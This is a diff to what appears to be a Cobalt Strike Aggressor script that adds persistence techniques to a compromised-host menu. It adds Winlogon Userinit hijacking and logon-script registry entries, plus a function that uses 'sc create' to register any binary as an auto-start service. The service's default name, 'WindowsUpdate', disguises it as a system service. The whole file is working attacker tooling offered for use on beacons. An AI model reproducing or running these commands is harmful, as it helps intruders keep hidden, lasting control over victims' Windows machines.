@@ -25,11 +25,32 @@ sub InstallAutoRun{
     $File = replace($3['CallBackFile'], "\"", "");
     $Key = "\"".$3['RegKey'];
     $Item = $3['RegItem']."\"";
-    $Reg = $Key.$Prefix.$Item;
-    bshell($bid,"reg add  $+ $Reg /f");
-    bshell($bid,"reg add  $+ $Reg /v Svchost /t REG_SZ /d \" $+ $File \" /f ");
+    if($3['RegItem'] eq "Winlogon"){
+        $Prefix = replace($Prefix,'Windows',"Windows NT");
+        $Reg = $Key.$Prefix.$Item;
+        bshell($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \" C:\\Windows\\system32\\userinit.exe, $+ $File \" /f ");
+    }
+    else if($3['RegItem'] eq "Logon Scripts"){
+        bshell($bid,"reg add  \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File \" /f ");
+    }
+    else{
+        $Reg = $Key.$Prefix.$Item;
+        bshell($bid,"reg add  $+ $Reg /f");
+        bshell($bid,"reg add  $+ $Reg /v Svchost /t REG_SZ /d \" $+ $File \" /f ");
+    }
 }
 
+
+sub InstallSchedule{
+    
+}
+
+sub InstallService{
+    local('$Name $Path');
+    $Name = $3['SerName'];
+    $Path = replace($3['Path'], "\"", "");
+    bshell($bid, "sc create \" $+ $Name\" binpath= \"cmd /c start \" $+ $Path\"\"&&sc config \" $+ $Name\" start= auto&&net start   $+ $Name");
+}
 
 
 #append menus
@@ -61,10 +82,25 @@ sub InstallAutoRun{
                         $Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", CallBackFile => "C:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallAutoRun);
                         dialog_description($Dialog, "Registry Add Boot Start Item");
                         drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
-                        drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx"));
+                        drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx", "Winlogon", "Logon Scripts"));
                         drow_text($Dialog, "CallBackFile", "CallBackFile: ");
                         dbutton_action($Dialog, "Reg");
                         dialog_show($Dialog);
                     }
+                }
+
+                #item "Schedule"{
+                #    
+                #}
+
+
+                item "Service"{
+                    $bid = $1['@'];
+                    $Dialog = dialog("Registration service",%(SerName => "WindowsUpdate", Path => "C:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallService);
+                    dialog_description($Dialog, "Register an executable file as a service");
+                    drow_text($Dialog, "SerName", "Service Name: ");
+                    drow_text($Dialog, "Path", "Bin Path: ");
+                    dbutton_action($Dialog, "Install");
+                    dialog_show($Dialog);
                 }
     }
